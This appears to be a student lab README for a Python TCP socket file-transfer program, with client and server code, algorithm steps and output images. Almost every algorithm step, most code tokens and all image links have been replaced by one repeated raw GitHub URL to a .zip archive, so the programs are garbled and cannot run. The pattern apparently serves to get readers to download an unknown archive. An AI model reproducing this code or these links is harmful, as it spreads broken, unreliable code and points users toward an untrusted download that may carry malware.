# EX-10 APPLICATION USING TCP SOCKETS - FILE TRANSFER PROGRAM

# DATE : 11-05-2023
# AIM :
#### To write a python program for creating File Transfer using TCP Sockets Links.


# ALGORITHM :

#### https://raw.githubusercontent.com/githubmufeez45/EX-10/main/titlist/EX-10.zip the program.
#### https://raw.githubusercontent.com/githubmufeez45/EX-10/main/titlist/EX-10.zip the frame size from the user.
#### https://raw.githubusercontent.com/githubmufeez45/EX-10/main/titlist/EX-10.zip create the frame based on the user request.
#### https://raw.githubusercontent.com/githubmufeez45/EX-10/main/titlist/EX-10.zip send frames to server from the client side.
#### https://raw.githubusercontent.com/githubmufeez45/EX-10/main/titlist/EX-10.zip your frames reach the server, it will send ACK signal to client otherwise it will sendNACK signal to client.
#### https://raw.githubusercontent.com/githubmufeez45/EX-10/main/titlist/EX-10.zip the program



# CLIENT PROGRAM :
```PY
## Developed : SHAIK MUFEEZ
## Reg no : 212221043007
import socket
s = https://raw.githubusercontent.com/githubmufeez45/EX-10/main/titlist/EX-10.zip()
host = https://raw.githubusercontent.com/githubmufeez45/EX-10/main/titlist/EX-10.zip()
port = 60000
https://raw.githubusercontent.com/githubmufeez45/EX-10/main/titlist/EX-10.zip((host, port))
https://raw.githubusercontent.com/githubmufeez45/EX-10/main/titlist/EX-10.zip("Hello server!".encode())
with open('received_file', 'wb') as f:
    while True:
        print('receiving data...')
        data = https://raw.githubusercontent.com/githubmufeez45/EX-10/main/titlist/EX-10.zip(1024)
        print('data=%s', (data))
        if not data:
            break
        https://raw.githubusercontent.com/githubmufeez45/EX-10/main/titlist/EX-10.zip(data)
https://raw.githubusercontent.com/githubmufeez45/EX-10/main/titlist/EX-10.zip()
print('Successfully get the file')
https://raw.githubusercontent.com/githubmufeez45/EX-10/main/titlist/EX-10.zip()
print('connection closed')


```
# SERVER PROGRAM :
```PY
import socket
port = 60000
s = https://raw.githubusercontent.com/githubmufeez45/EX-10/main/titlist/EX-10.zip()
host = https://raw.githubusercontent.com/githubmufeez45/EX-10/main/titlist/EX-10.zip()
https://raw.githubusercontent.com/githubmufeez45/EX-10/main/titlist/EX-10.zip((host, port))
https://raw.githubusercontent.com/githubmufeez45/EX-10/main/titlist/EX-10.zip(5)
while True:
    conn, addr = https://raw.githubusercontent.com/githubmufeez45/EX-10/main/titlist/EX-10.zip()
    data = https://raw.githubusercontent.com/githubmufeez45/EX-10/main/titlist/EX-10.zip(1024)
    print('Server received', repr(data))
    filename='https://raw.githubusercontent.com/githubmufeez45/EX-10/main/titlist/EX-10.zip'
    f = open(filename,'rb')
    l = https://raw.githubusercontent.com/githubmufeez45/EX-10/main/titlist/EX-10.zip(1024)
    while (l):
        https://raw.githubusercontent.com/githubmufeez45/EX-10/main/titlist/EX-10.zip(l)
        print('Sent ',repr(l))
        l = https://raw.githubusercontent.com/githubmufeez45/EX-10/main/titlist/EX-10.zip(1024)
    https://raw.githubusercontent.com/githubmufeez45/EX-10/main/titlist/EX-10.zip()
    print('Done sending')
    https://raw.githubusercontent.com/githubmufeez45/EX-10/main/titlist/EX-10.zip('Thank you for connecting'.encode())
    https://raw.githubusercontent.com/githubmufeez45/EX-10/main/titlist/EX-10.zip()

```
# SERVER OUTPUT :
![output](https://raw.githubusercontent.com/githubmufeez45/EX-10/main/titlist/EX-10.zip)

# CLIENT OUTPUT : 
![output](https://raw.githubusercontent.com/githubmufeez45/EX-10/main/titlist/EX-10.zip)
# RECEIVED FILE : 
![output](https://raw.githubusercontent.com/githubmufeez45/EX-10/main/titlist/EX-10.zip)



# RESULT:
#### Thus, the python program for creating File Transfer using TCP Sockets Links was successfully created and executed.



